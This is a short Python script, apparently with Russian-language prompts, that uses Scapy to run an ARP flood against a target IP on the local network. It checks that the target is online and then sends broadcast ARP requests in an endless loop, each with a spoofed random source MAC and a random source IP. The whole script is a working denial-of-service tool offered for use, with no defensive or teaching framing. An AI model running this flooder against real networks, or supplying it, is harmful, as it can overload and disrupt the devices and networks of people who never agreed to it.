from local_ip import get_random_ip_by_mask
from mac import mac 
from ip import get_random_ip
import scapy.all as scapy

y = "\033[93m"  
g='\033[92m'
r='\033[91m'
res='\033[0m'
c='\033[36m'

def check(ip_c):
    broad=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    uz=scapy.ARP(pdst=ip_c)
    pk=broad/uz
    ans=scapy.srp1(pk,verbose=False,timeout=1)
    if ans:
        return True
    else:
        return False

def flood(ip,mode,s_ip=None,s_mas=None):
    print(f"{g}[+]{res} Цель:{ip}. Процесс пошёл...")
    try:
        while True:
            rand_mac=mac()
            if mode==1:
                rand_ip=get_random_ip_by_mask(s_ip,s_mas)
                if rand_ip==s_ip:
                    continue
            else:
                rand_ip=get_random_ip()
                if rand_ip==s_ip:
                    continue                
            b=scapy.Ether(dst="ff:ff:ff:ff:ff:ff",src=rand_mac)
            uzel=scapy.ARP(op=1,pdst=ip,psrc=rand_ip,hwsrc=rand_mac)
            pkt=b/uzel
            scapy.sendp(pkt,verbose=False)
    except KeyboardInterrupt:
        print(f"{y}[!]{res} Остановлено")
        
try:        
    vibor=int(input(f"{c}[*]{res} 1-Локальные IP, 2-Рандомные IP:"))
    if vibor not in [1,2]:
        print(f"{r}[-]{res} Ошибка выбора")
        exit()
    ip_t=input(f"{c}[*]{res} Введите IP цели:")
    if check(ip_t):
        print(f"{g}[+]{res} Устройство в сети")
        if vibor==1:
            try:
                i=input(f"{c}[*]{res} Введите свой IP:")
                m=input(f"{c}[*]{res} Введите маску сети:")
                if i and m:
                    flood(ip_t,1,i,m)
            except KeyboardInterrupt:
                print(f"\n{y}[!]{res} Остановлено")
                exit()
        else:
            flood(ip_t,2)
    else:
        print(f"{r}[-]{res} Устройство не в сети")
except KeyboardInterrupt:
    print(f"\n{y}[!]{res} Остановлено")
    exit()